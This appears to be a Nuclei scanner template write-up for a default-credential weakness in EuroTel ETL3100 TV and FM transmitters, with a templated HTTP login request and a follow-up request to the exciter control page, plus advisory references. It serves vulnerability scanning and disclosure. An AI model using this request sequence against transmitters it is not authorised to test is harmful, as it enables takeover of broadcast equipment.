# Nuclei Template: EuroTel ETL3100 - Default Login
**Template ID:** etl3100-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`etl3100-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The TV and FM transmitter uses a weak set of default administrative credentials that can be guessed in remote password attacks and gain full control of the system.

## Steps to reproduce / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

txtUserId={{username}}&txtPassword={{password}}&btnLogin=Login

GET /exciter.php HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5782.php
- https://www.exploit-db.com/exploits/51684
